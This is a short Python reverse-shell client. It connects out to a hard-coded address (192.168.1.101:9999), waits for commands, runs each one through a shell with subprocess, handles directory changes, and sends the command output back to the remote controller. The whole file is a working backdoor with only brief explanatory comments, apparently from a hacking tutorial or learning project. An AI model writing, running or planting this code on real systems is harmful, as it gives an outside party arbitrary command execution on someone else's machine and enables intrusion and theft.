import socket
import os
import subprocess

s=socket.socket()
#Localhost has a dynamic ip address, so the ip changes everytime the host restarts the computer

host="192.168.1.101"
port=9999
#tuple which connects host ip to particular port
s.connect((host,port))
while True:
    data=s.recv(1024)
    #First check whether the host is trying to send cd command.. then take the change directory path and execute it on the shell
    if data[:2].decode("utf-8")=='cd':
        os.chdir(data[3:].decode("utf-8"))
    #ignore empty shell command
    if len(data)>0:
        cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte=cmd.stdout.read()+cmd.stderr.read()
        output_str=str(output_byte,"utf-8")
        #> for windows $ for linux
        currentWD=os.getcwd()+">"
        s.send(str.encode(output_str+currentWD))

        print(output_str)